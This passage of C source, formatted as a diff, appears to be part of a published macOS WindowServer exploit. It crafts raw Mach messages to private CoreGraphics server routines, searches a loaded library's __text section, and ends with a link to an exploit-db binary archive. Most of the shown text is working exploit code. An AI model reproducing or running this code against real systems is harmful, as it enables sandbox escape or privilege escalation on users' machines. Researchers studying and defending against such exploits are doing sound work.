+        if (set_array_values[i] != NULL)
+            CFRelease(set_array_values[i]); 
+    if (data != NULL)
+        CFRelease(data);
+    if (big_array != NULL)
+        CFRelease(big_array);
+    return -1;
+}
+
+static int find_dylib_text_section(const char *dylib_name, void **text_address, size_t *text_size)
+{
+    uint32_t image_count = _dyld_image_count();
+
+    for (uint32_t i = 0; i < image_count; i++)
+    {
+        const char *current_dylib_name = _dyld_get_image_name(i);
+        ENFORCE(current_dylib_name != NULL, fail);
+        if (strcmp(current_dylib_name, dylib_name) != 0)
+            continue;
+        const struct mach_header_64 *dylib_header = (const struct mach_header_64 *)_dyld_get_image_header(i);
+        ENFORCE(dylib_header != NULL, fail);
+        ENFORCE(dylib_header->magic == MH_MAGIC_64, fail);
+
+        uint32_t max_size = dylib_header->sizeofcmds;
+        ENFORCE(max_size < 0x2000, fail);
+
+        struct load_command *load_command = (struct load_command *)(dylib_header+1);
+        struct load_command *next_command;
+        ENFORCE(dylib_header->ncmds < 0x100, fail);
+        for (uint32_t cmd_i = 0; cmd_i < dylib_header->ncmds; cmd_i++, load_command = next_command)
+        {
+            ENFORCE(load_command->cmdsize <= max_size, fail);
+            ENFORCE(load_command->cmdsize >= sizeof(struct load_command), fail);
+            next_command = (struct load_command *)((uintptr_t)load_command + load_command->cmdsize);
+            max_size -= load_command->cmdsize;
+
+            if (load_command->cmd != LC_SEGMENT_64)
+                continue;
+
+            ENFORCE(load_command->cmdsize >= sizeof(struct segment_command_64), fail);
+            struct segment_command_64 *segment_command_64 = (struct segment_command_64 *)load_command;
+            if (strcmp(segment_command_64->segname, "__TEXT") != 0)
+                continue;
+            struct section_64 *sections = (struct section_64 *)(segment_command_64 + 1);
+            ENFORCE(segment_command_64->nsects < 0x100, fail);
+            ENFORCE(load_command->cmdsize == sizeof(struct segment_command_64) + segment_command_64->nsects*sizeof(struct section_64), fail);
+            for (uint32_t sect_i = 0; sect_i < segment_command_64->nsects; sect_i++)
+            {
+                if (strcmp(sections[sect_i].sectname, "__text") != 0)
+                    continue;
+                *text_address = (void *)(sections[sect_i].addr + _dyld_get_image_vmaddr_slide(i));
+                *text_size = sections[sect_i].size;
+                return 0;
+            }
+        }
+    }
+fail:
+    return -1;
+}
+
+#pragma pack(push, 4)
+typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t ool_serialized_value;
+        NDR_record_t NDR_record;
+        uint64_t connection_id;
+        uint32_t key_len;
+        char key[128];
+        uint32_t serialized_value_length;
+} CGSSetConnectionProperty_message_t;
+#pragma pack(pop)
+
+static mach_msg_return_t _CGSSetConnectionProperty(mach_port_t connection_port, int connection_id, const char *key_value, const void *serialized_value, uint32_t serialized_value_length, bool deallocate)
+{
+    CGSSetConnectionProperty_message_t msg;
+    memset(&msg, 0, sizeof(msg));
+
+    msg.body.msgh_descriptor_count = 1;
+    
+    msg.ool_serialized_value.type = MACH_MSG_OOL_DESCRIPTOR;
+    msg.ool_serialized_value.address = (void *)serialized_value;
+    msg.ool_serialized_value.size = serialized_value_length;
+    msg.ool_serialized_value.deallocate = deallocate;
+    msg.ool_serialized_value.copy = MACH_MSG_VIRTUAL_COPY;
+
+    msg.NDR_record = NDR_record;
+    msg.connection_id = connection_id;
+    strncpy(msg.key, key_value, sizeof(msg.key));
+    msg.key_len = 127;
+    msg.serialized_value_length = serialized_value_length;
+
+
+    msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    msg.header.msgh_remote_port = connection_port;
+    msg.header.msgh_id = 29398;
+
+    kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+    return kr;
+}
+
+
+#pragma pack(push, 4)
+typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t ool_serialized_value;
+        NDR_record_t NDR_record;
+        uint32_t serialized_value_length;
+} CGSSetPerUserConfigurationData_message_t;
+#pragma pack(pop)
+
+#pragma pack(push, 4)
+typedef struct {
+        mach_msg_header_t header;
+        NDR_record_t NDR_record;
+        uint64_t process_serial_number;
+        uint32_t connection_id;
+} CGSSetAuxConn_message_t;
+#pragma pack(pop)
+
+static mach_msg_return_t _CGSSetAuxConn(uint32_t connection_id, ProcessSerialNumber *process_serial_number)
+{
+    CGSSetAuxConn_message_t msg;
+    memset(&msg, 0, sizeof(msg));
+    
+    msg.connection_id = connection_id;
+    msg.process_serial_number = *(uint64_t *)process_serial_number;
+
+    msg.NDR_record = NDR_record;
+
+    msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, 0);
+    msg.header.msgh_remote_port = CGSGetConnectionPortById(connection_id);
+    msg.header.msgh_id = 29368;
+
+    return mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+}
+
+#pragma pack(push, 4)
+typedef struct {
+    mach_msg_header_t header;
+    NDR_record_t NDR_record;
+    ProcessSerialNumber sn;
+    uint32_t session_id;
+    uint32_t session_attributes;
+    uint32_t unknown_2;
+    uint32_t pid;
+    uint32_t padding_1;
+    uint32_t app_name_len;
+    char app_name[128];
+    char multi_process;
+    uint32_t connection_id;
+    uint32_t padding_2;
+} CGSCreateApplication_message_t;
+
+typedef struct {
+    mach_msg_header_t header;
+    NDR_record_t NDR_record;
+    kern_return_t retcode;
+} CGSCreateApplication_reply_t;
+#pragma pack(pop)
+
+static mach_msg_return_t _CGSCreateApplication(uint32_t connection_id, ProcessSerialNumber sn, uint32_t session_id, uint32_t session_attributes, uint32_t unknown_2, pid_t pid, char *app_name, char multi_process, uint32_t sent_connection_id)
+{
+    CGSCreateApplication_message_t msg;
+    memset(&msg, 0, sizeof(msg));
+    
+    msg.connection_id = connection_id;
+    msg.sn = sn;
+    msg.session_id = session_id;
+    msg.session_attributes = session_attributes;
+    msg.unknown_2 = unknown_2;
+    msg.pid = pid;
+    strncpy(msg.app_name, app_name, sizeof(msg.app_name));
+    msg.app_name_len = 127;
+    msg.multi_process = multi_process;
+    msg.connection_id = sent_connection_id;
+
+    msg.NDR_record = NDR_record;
+
+    msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    msg.header.msgh_remote_port = CGSGetConnectionPortById(connection_id);
+    msg.header.msgh_id = 29507;
+    msg.header.msgh_local_port = mig_get_reply_port();
+
+    mach_msg_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG|MACH_RCV_MSG, sizeof(msg), sizeof(msg), msg.header.msgh_local_port, 0, 0);
+    if (kr != KERN_SUCCESS)
+    {
+        switch (kr) {
+            case MACH_SEND_INVALID_DATA:
+            case MACH_SEND_INVALID_DEST:
+            case MACH_SEND_INVALID_HEADER:
+                mig_put_reply_port(msg.header.msgh_local_port);
+                break;
+            default: 
+                mig_dealloc_reply_port(msg.header.msgh_local_port);
+        }
+    }
+    else
+        kr = ((CGSCreateApplication_reply_t *)&msg)->retcode;
+    return kr;
+}
+
+
+static void timed_log(char* format, ...)
+{
+    char buffer[30];
+
+    struct tm* time_info;
+    time_t t = time(NULL);
+    time_info = localtime(&t);
+    strftime(buffer, 30, "%Y-%m-%d %H:%M:%S ", time_info);
+    fputs(buffer, stderr);
+
+    va_list args;
+    va_start(args, format);
+    vfprintf(stderr, format, args);
+    va_end(args);
+}
+
+
+# Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46428.zip
